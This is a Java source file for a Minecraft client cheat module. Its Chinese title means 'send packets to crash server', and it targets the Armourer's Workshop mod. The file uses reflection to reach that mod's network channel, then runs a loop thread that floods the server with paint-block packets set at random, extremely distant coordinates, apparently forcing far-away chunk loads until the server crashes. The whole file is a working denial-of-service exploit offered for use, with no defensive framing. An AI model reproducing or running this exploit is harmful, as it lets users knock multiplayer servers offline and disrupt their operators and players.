package moe.badcat.module.modules;

import moe.badcat.module.BaseEnableModule;
import net.minecraft.client.Minecraft;
import net.minecraft.network.NetworkManager;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.SimpleNetworkWrapper;

import java.util.Random;

public class ModuleAWCrash extends BaseEnableModule {
    private Random random = new Random();

    private Class<?> class_PacketHandler;
    private Class<?> class_MessageClientToolPaintBlock;
    private SimpleNetworkWrapper instance_SimpleNetworkWrapper;

    public ModuleAWCrash() {
        super("发包崩服", "时装工坊");
    }

    @Override
    public boolean initModule() {
        try {
            class_PacketHandler = Class.forName("moe.plushie.armourers_workshop.common.network.PacketHandler");
            instance_SimpleNetworkWrapper = (SimpleNetworkWrapper)class_PacketHandler.getField("networkWrapper").get(null);
            if (instance_SimpleNetworkWrapper == null) return false;

            class_MessageClientToolPaintBlock = Class.forName("moe.plushie.armourers_workshop.common.network.messages.client.MessageClientToolPaintBlock");

            return true;
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public void onUse() {
        super.onUse();

        if (isEnable()) {
            startSendPacketThread();
        }
    }

    public void startSendPacketThread() {
        NetworkManager networkManager = Minecraft.getMinecraft().getConnection().getNetworkManager();
        new Thread(() -> {
            while (enable && networkManager.isChannelOpen()) {
                try {
                    IMessage packet = (IMessage) class_MessageClientToolPaintBlock.getConstructor(BlockPos.class, EnumFacing.class, byte[].class)
                            .newInstance(new BlockPos(random.nextInt(50000) << 9, 100, random.nextInt(50000) << 9), EnumFacing.UP, new byte[4]);
                    instance_SimpleNetworkWrapper.sendToServer(packet);
                } catch (Exception e) {
                    if (ModuleDebug.enable) e.printStackTrace();
                    break;
                }
                try { Thread.sleep(ModulePacketDelay.delay); } catch (InterruptedException ignored) { }
            }
            enable = false;
        }).start();
    }
}
